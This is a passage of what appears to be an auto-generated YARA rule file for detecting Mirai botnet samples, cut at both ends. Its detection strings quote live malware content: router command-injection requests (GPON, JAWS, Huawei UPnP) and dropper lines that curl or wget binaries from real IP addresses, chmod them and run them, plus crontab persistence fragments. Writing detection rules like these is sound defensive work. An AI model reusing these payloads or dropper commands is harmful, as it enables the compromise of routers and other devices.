      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__bfe6e840 {
   meta:
      description = "_subset_batch - file Mirai(signature)_bfe6e840.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bfe6e8404d374aa72701f8118b372100eb5d06ba9d7584841e3b857b21068727"
   strings:
      $s1 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s2 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s3 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s4 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s5 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s6 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s7 = "cvkqpav" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__fa6fc519 {
   meta:
      description = "_subset_batch - file Mirai(signature)_fa6fc519.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fa6fc51950895b07fecdaa5760142f1a6dd05f58300a738f8d35a458a411eba9"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "GET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s5 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
      $s6 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "POST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
      $s10 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s11 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s12 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s13 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s14 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s15 = "vaehpao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__b3458a26 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b3458a26.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b3458a261d3b53a193f7327f330d0047a9fe3a94fa3f2e164f3259f53bb454bb"
   strings:
      $s1 = "Killed process: " fullword ascii /* score: '15.00'*/
      $s2 = "/home/process/" fullword ascii /* score: '15.00'*/
      $s3 = "/usr/libexec/" fullword ascii /* score: '12.00'*/
      $s4 = "/system/system/bin/" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__b3ab2fcb {
   meta:
      description = "_subset_batch - file Mirai(signature)_b3ab2fcb.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b3ab2fcb3624c3d9db00a71f93ed218149061e54a07e9d4736be6ec017e8ab62"
   strings:
      $s1 = "Killed process: " fullword ascii /* score: '15.00'*/
      $s2 = "/home/process/" fullword ascii /* score: '15.00'*/
      $s3 = "/usr/libexec/" fullword ascii /* score: '12.00'*/
      $s4 = "/system/system/bin/" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__d175b538 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d175b538.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d175b53859f3614ac834d0972628ce709d4f411f71a45c69046adb0f88db393f"
   strings:
      $s1 = "Killed process: " fullword ascii /* score: '15.00'*/
      $s2 = "/home/process/" fullword ascii /* score: '15.00'*/
      $s3 = "/usr/libexec/" fullword ascii /* score: '12.00'*/
      $s4 = "/system/system/bin/" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__c02c045d {
   meta:
      description = "_subset_batch - file Mirai(signature)_c02c045d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c02c045d61cb17eb2ca0b2b1b3928be54f97cb072c13cb79e11c83a4f007201a"
   strings:
      $s1 = "udevadm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__e265dc0f {
   meta:
      description = "_subset_batch - file Mirai(signature)_e265dc0f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e265dc0f30fe92f3aeb7c2722d4aff0a6310b3dd90a30ff10c3a77c507fcee56"
   strings:
      $s1 = "8__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s2 = "$bad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
      $s3 = "udevadm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__e377c5fa {
   meta:
      description = "_subset_batch - file Mirai(signature)_e377c5fa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e377c5fafa489ea1ca15afb598878ee52e707aca5f9aeac021b8528c71de4ad6"
   strings:
      $s1 = "udevadm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__cd9e0314 {
   meta:
      description = "_subset_batch - file Mirai(signature)_cd9e0314.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cd9e0314c417316e8c260061ef4bfa94b5cd527c36f405c5c3e4a05c71b6b3d6"
   strings:
      $s1 = "u__get_myaddress: socket" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__ce82a212 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ce82a212.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ce82a2127818385008fd9b9c977d7f1b47d4a070a0c74b5c7c3c6ed15bc8bf85"
   strings:
      $s1 = "WantedBy=multi-user.target" fullword ascii /* score: '17.00'*/
      $s2 = "getchal" fullword ascii /* score: '13.00'*/
      $s3 = "/tmp/rc.local.tmp" fullword ascii /* score: '13.00'*/
      $s4 = "u__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s5 = "(crontab -l 2>/dev/null; echo \"" fullword ascii /* score: '12.00'*/
      $s6 = "\") | crontab - >/dev/null 2>&1" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1" fullword ascii /* score: '9.00'*/
      $s8 = "systemctl start " fullword ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 Chrome/91.0.4472.120 Mobile Safari/537.36" fullword ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s11 = "systemctl enable " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule Mirai_signature__f867e97d {
   meta:
      description = "_subset_batch - file Mirai(signature)_f867e97d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f867e97d94f87343ec665f8c7aa7fcd767d32bf7afe229a68c3c429f9c957d0c"
   strings:
      $s1 = "u__get_myaddress: socket" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__b4d11c37 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b4d11c37.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b4d11c37956efea5d2ee730be6e915719b0d3e02bb01a7e2cca840b4a602da1d"
   strings:
      $s1 = "<N^NuPOST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s3 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s4 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s5 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s6 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s7 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s8 = "cvkqpav" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__c20bd1ff {
   meta:
      description = "_subset_batch - file Mirai(signature)_c20bd1ff.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c20bd1ff005ab0ec70d71a682ddbb77e9ff0b8f915b1c9103339221560ee5709"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "GET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s5 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
      $s6 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "POST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
      $s10 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s11 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s12 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s13 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s14 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s15 = "vaehpao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__c2a92de1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c2a92de1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c2a92de1ca1de2228af1b1be5ab60ab5b5f0d7b8e16fa89bced4b76974ccb067"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "GET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s5 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
      $s6 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "POST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
      $s10 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s11 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s12 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s13 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s14 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s15 = "vaehpao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__c5891453 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c5891453.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c5891453cba79d342c82b4db270978f4fefd5afe051df61a88ac185773e359c7"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "GET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s5 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
      $s6 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "POST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
      $s10 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s11 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s12 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s13 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s14 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s15 = "vaehpao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__d2b0f0fc {
   meta:
      description = "_subset_batch - file Mirai(signature)_d2b0f0fc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d2b0f0fc4e26bfa5ae49790a36f9a70c8b8ae7c741ec9bc2680c38e59183d34f"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "GET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s5 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
      $s6 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "POST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
      $s10 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s11 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s12 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s13 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s14 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s15 = "vaehpao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__d592c8eb {
   meta:
      description = "_subset_batch - file Mirai(signature)_d592c8eb.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d592c8eb8cecf6a3de383a0f1391bd625dd98ecdb2d43cf68c4ed5417ae20066"
   strings:
      $s1 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s2 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s3 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s4 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s5 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s6 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s7 = "cvkqpav" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__b84d6444 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b84d6444.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b84d64444f062f773da9c3de2c7edc71f9e9aa6484aa5cd8d269c969fae90a4b"
   strings:
      $s1 = "curl http://176.65.132.57/bins/m68k; chmod 777 m68k; ./m68k m68k" fullword ascii /* score: '18.00'*/
      $s2 = "curl http://176.65.132.57/bins/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '18.00'*/
      $s3 = "curl http://176.65.132.57/bins/sh4; chmod 777 sh4; ./sh4 sh4" fullword ascii /* score: '18.00'*/
      $s4 = "curl http://176.65.132.57/bins/spc; chmod 777 spc; ./spc spc" fullword ascii /* score: '18.00'*/
      $s5 = "curl http://176.65.132.57/bins/x86; chmod 777 x86; ./x86 x86" fullword ascii /* score: '18.00'*/
      $s6 = "curl http://176.65.132.57/bins/mipsel; chmod 777 mipsel; ./mpsel mipsel" fullword ascii /* score: '18.00'*/
      $s7 = "curl http://176.65.132.57/bins/ppc; chmod 777 ppc; ./ppc ppc" fullword ascii /* score: '18.00'*/
      $s8 = "curl http://176.65.132.57/bins/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '18.00'*/
      $s9 = "curl http://176.65.132.57/bins/arm; chmod 777 arm; ./arm arm" fullword ascii /* score: '18.00'*/
      $s10 = "curl http://176.65.132.57/bins/x86_64; chmod 777 x86_64; ./x86_64 x86_64" fullword ascii /* score: '18.00'*/
      $s11 = "curl http://176.65.132.57/bins/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '18.00'*/
      $s12 = "curl http://176.65.132.57/bins/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x7563 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__b8cb9d06 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b8cb9d06.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b8cb9d067db68522bab93f83dfe9b99532a013477fe15d768235404259e037a0"
   strings:
      $s1 = "wget http://45.125.66.89/m/arm4" fullword ascii /* score: '17.00'*/
      $s2 = "wget http://45.125.66.89/m/arm5" fullword ascii /* score: '17.00'*/
      $s3 = "wget http://45.125.66.89/m/mpsl" fullword ascii /* score: '17.00'*/
      $s4 = "wget http://45.125.66.89/m/moobs" fullword ascii /* score: '17.00'*/
      $s5 = "wget http://45.125.66.89/m/arm7" fullword ascii /* score: '17.00'*/
      $s6 = "rm -rf moobs mpsl arm4 arm5 arm7" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6d72 and filesize < 1KB and
      all of them
}

rule Mirai_signature__baaff9fd {
   meta:
      description = "_subset_batch - file Mirai(signature)_baaff9fd.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "baaff9fdce65772a749c4faeaef1dda16d74b2a327a7816ca6e613bbd310c12d"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__da75947e {
   meta:
      description = "_subset_batch - file Mirai(signature)_da75947e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "da75947e85930ea48aa5ba32ac02acccb83eb333f43b3401156b359b88aa9688"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__e3214808 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e3214808.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e3214808695c1ae129b8276a4fe9e111ec0471a80d287061c4ba0ad4c1c9ed55"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
      $s2 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__e72d5131 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e72d5131.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e72d51312ee1313f29864096db17c6dc59de381ce6dc2d07d4795e997161df27"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
      $s2 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__e9848e27 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e9848e27.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e9848e2732cdd87446be6e476959811afd8b24c65657560ad75c4da3a16ca4c0"
   strings:
      $s1 = "f(__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s2 = "Ftbad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__f3694a12 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f3694a12.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f3694a12963f3964e8979ab518be4cee3ae6636f75e5f67e2185a6f0a1ee0f9b"
   strings:
      $s1 = "(diicot/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(diicot/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "f,__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s4 = "Fxbad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__f780dc09 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f780dc09.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f780dc09d326a38c0d712fea1243112d6148f81d323529bd726ffca0e8382805"
   strings:
      $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '29.00'*/
      $s2 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s3 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s4 = "--login" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__bcecfd3f {
   meta:
      description = "_subset_batch - file Mirai(signature)_bcecfd3f.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bcecfd3f685154861d529f149eb17eee4fedad92b5fec163fc2c20f25fe60922"
   strings:
      $s1 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.spc; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.spc; ./nwfaiehg4ewi" ascii /* score: '18.00'*/
      $s2 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.spc; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.spc; ./nwfaiehg4ewi" ascii /* score: '18.00'*/
      $s3 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm; ./nwfaiehg4ewi" ascii /* score: '18.00'*/
      $s4 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.ppc; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.ppc; ./nwfaiehg4ewi" ascii /* score: '18.00'*/
      $s5 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.ppc; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.ppc; ./nwfaiehg4ewi" ascii /* score: '18.00'*/
      $s6 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm; ./nwfaiehg4ewi" ascii /* score: '18.00'*/
      $s7 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm6; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm6; ./nwfaiehg4e" ascii /* score: '15.00'*/
      $s8 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.i586; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.i586; ./nwfaiehg4e" ascii /* score: '15.00'*/
      $s9 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.mpsl; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.mpsl; ./nwfaiehg4e" ascii /* score: '15.00'*/
      $s10 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm5; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm5; ./nwfaiehg4e" ascii /* score: '15.00'*/
      $s11 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.mpsl; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.mpsl; ./nwfaiehg4e" ascii /* score: '15.00'*/
      $s12 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm7; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm7; ./nwfaiehg4e" ascii /* score: '15.00'*/
      $s13 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.x86_64; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.x86_64; ./nwfaie" ascii /* score: '15.00'*/
      $s14 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.mips; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.mips; ./nwfaiehg4e" ascii /* score: '15.00'*/
      $s15 = "curl http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.x86; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.x86; ./nwfaiehg4ewi" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x7563 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__c0dfdacb {
   meta:
      description = "_subset_batch - file Mirai(signature)_c0dfdacb.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c0dfdacb0cd75b71c9ad81cb6cb9228798e8788910cc9f98a1e524824fc3f288"
   strings:
      $s1 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.ppc; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.ppc; ./nwfaiehg4ewi" ascii /* score: '23.00'*/
